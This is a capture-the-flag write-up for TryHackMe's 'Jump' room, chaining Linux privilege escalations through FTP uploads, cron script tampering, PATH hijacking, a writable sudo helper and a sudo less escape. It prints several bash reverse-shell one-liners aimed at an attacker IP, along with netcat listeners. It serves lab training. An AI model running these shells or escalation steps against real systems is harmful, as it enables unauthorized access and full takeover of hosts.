# TryHackMe: Jump — Linux Privilege Escalation Write-up

**Date:** July 07, 2026  
**Category:** Linux Privilege Escalation / Enumeration  

## Overview

Starting with only the target machine's IP address and no valid credentials, the objective of **Jump** is to gain an initial foothold and chain multiple horizontal and vertical privilege escalations across four user accounts (`recon_user` → `dev_user` → `monitor_user` → `ops_user`) before reaching `root`.

---

## Stage 1: Initial Access (`recon_user`)

### Enumeration
1. Running an `nmap` scan reveals an open **FTP** service (`port 21`) with anonymous login enabled.
2. Connect via FTP as `anonymous` and inspect the directory contents.
3. Download `README.txt` to the AttackBox:
   > *"All recon jobs must be placed in `incoming/`"*

### Exploitation
Since files uploaded to `incoming/` are automatically executed by `recon_user`, we can upload a Bash reverse shell script.

1. Create `rev_shell.sh` on the AttackBox:
   ```bash
   #!/bin/bash
   bash -i >& /dev/tcp/<YOUR_ATTACKER_IP>/5555 0>&1
   ```
2. Start a Netcat listener on port `5555`:
   ```bash
   nc -lvnp 5555
   ```
3. Upload the payload via the active FTP session:
   ```bash
   cd incoming
   put rev_shell.sh
   ```
4. Once the reverse shell connects, retrieve the first flag:
   ```bash
   cat /home/recon_user/flag.txt
   ```

---

## Stage 2: `recon_user` → `dev_user`

### Enumeration
Standard checks (`sudo -l`, SUID binaries, and `/etc/crontab`) return nothing useful. To monitor background processes and cron jobs executing in real time, transfer **pspy64** to the target:

1. Host `pspy64` from the AttackBox:
   ```bash
   wget [https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64](https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64)
   python3 -m http.server 8000
   ```
2. Download and execute it on the target machine:
   ```bash
   wget http://<YOUR_ATTACKER_IP>:8000/pspy64
   chmod +x pspy64
   ./pspy64
   ```
3. `pspy64` reveals `/opt/dev/backup.sh` running periodically under `UID=1002` (`dev_user`):


4. Check file permissions and group memberships:
   ```bash
   ls -la /opt/dev/backup.sh
   id
   ```


`recon_user` belongs to the `dev_user` group (`gid=1002`), and `/opt/dev/backup.sh` has group write permissions (`-rwxrwxr-x`).

### Exploitation
1. Start a listener on port `5556`:
   ```bash
   nc -lvnp 5556
   ```
2. Append a reverse shell payload to `/opt/dev/backup.sh`:
   ```bash
   echo 'bash -i >& /dev/tcp/<YOUR_ATTACKER_IP>/5556 0>&1' >> /opt/dev/backup.sh
   ```
3. Wait for the scheduled task to trigger and catch the `dev_user` shell, then read the flag:
   ```bash
   cat /home/dev_user/flag.txt
   ```

---

## Stage 3: `dev_user` → `monitor_user`

### Enumeration
1. Running `pspy64` again reveals `/usr/local/bin/healthcheck` executing periodically.
2. Inspecting the script shows it invokes `ps aux` without using an absolute path (`/bin/ps`), making it vulnerable to **PATH Hijacking**.
3. Search for files writable by `dev_user`:
   ```bash
   find / -type f -writable 2>/dev/null
   ```
   This returns `/opt/dev/bin/ps`, which sits in the execution `PATH` of the healthcheck script.

### Exploitation
1. Overwrite `/opt/dev/bin/ps` with a reverse shell payload and ensure it is executable:
   ```bash
   echo -e '#!/bin/bash\nsetsid bash -i >& /dev/tcp/<YOUR_ATTACKER_IP>/5557 0>&1' > /opt/dev/bin/ps
   chmod +x /opt/dev/bin/ps
   ```

2. Start a listener on port `5557`:
   ```bash
   nc -lvnp 5557
   ```
3. Wait for `/usr/local/bin/healthcheck` to run and catch the `monitor_user` shell.

---

## Stage 4: `monitor_user` → `ops_user`

### Enumeration
1. Check `sudo` privileges for `monitor_user`:
   ```bash
   sudo -l
   ```


`monitor_user` can execute `/usr/local/bin/deploy.sh` as `ops_user` without a password.

2. Inspect `/usr/local/bin/deploy.sh` and its helper script `/opt/app/deploy_helper.sh`:
   ```bash
   cat /usr/local/bin/deploy.sh
   cat /opt/app/deploy_helper.sh
   ls -la /opt/app/deploy_helper.sh
   ```



`/usr/local/bin/deploy.sh` calls `./deploy_helper.sh`, which is owned by and writable by `monitor_user`.

### Exploitation
1. Overwrite `/opt/app/deploy_helper.sh` with a reverse shell payload:
   ```bash
   echo -e '#!/bin/bash\nbash -i >& /dev/tcp/<YOUR_ATTACKER_IP>/5558 0>&1' > /opt/app/deploy_helper.sh
   chmod +x /opt/app/deploy_helper.sh
   ```
2. Start a listener on port `5558`:
   ```bash
   nc -lvnp 5558
   ```
3. Execute `deploy.sh` via `sudo` to receive an `ops_user` shell:
   ```bash
   sudo -u ops_user /usr/local/bin/deploy.sh
   ```

---

## Stage 5: `ops_user` → `root`

### Enumeration
Check `sudo` privileges for `ops_user`:
```bash
sudo -l
```


`ops_user` can run `/usr/bin/less` as `root` without a password.

### Exploitation
Per **GTFOBins**, `less` can be used with `sudo` to read privileged files directly (or spawn a root shell using `!/bin/sh` inside the pager).

Read the root flag directly:
```bash
sudo -u root /usr/bin/less /root/flag.txt
```
